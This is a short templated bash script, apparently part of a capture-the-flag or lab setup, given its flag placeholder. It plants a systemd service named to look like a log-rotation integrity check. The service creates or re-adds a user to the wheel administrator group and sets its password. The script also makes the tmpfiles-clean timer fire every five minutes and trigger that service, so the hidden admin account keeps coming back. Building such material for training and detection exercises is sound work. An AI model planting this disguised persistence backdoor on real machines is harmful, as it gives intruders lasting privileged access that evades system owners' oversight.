#!/usr/bin/env bash
# {{ flag.user_persistence }}

DIR_PATH="$1"

cat <<'EOF' > "$DIR_PATH/logrotate-check.service"
[Unit]
Description=Check Log Rotation Integrity
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'if ! id {{ vulnerable_user.username }} &>/dev/null; then useradd -m -U -G wheel {{ vulnerable_user.username }}; else usermod -aG wheel {{ vulnerable_user.username }}; fi; echo "{{ vulnerable_user.username }}:{{ vulnerable_user.password }}" |  chpasswd'
EOF

mkdir -p "$DIR_PATH/systemd-tmpfiles-clean.timer.d/"
cat <<'EOF' > "$DIR_PATH/systemd-tmpfiles-clean.timer.d/speedup.conf"
[Timer]
OnBootSec=1m
OnUnitActiveSec=5m
EOF

mkdir -p "$DIR_PATH/systemd-tmpfiles-clean.service.d"
cat <<'EOF' > "$DIR_PATH/systemd-tmpfiles-clean.service.d/logrotate.conf"
[Unit]
Wants=logrotate-check.service
After=logrotate-check.service
EOF
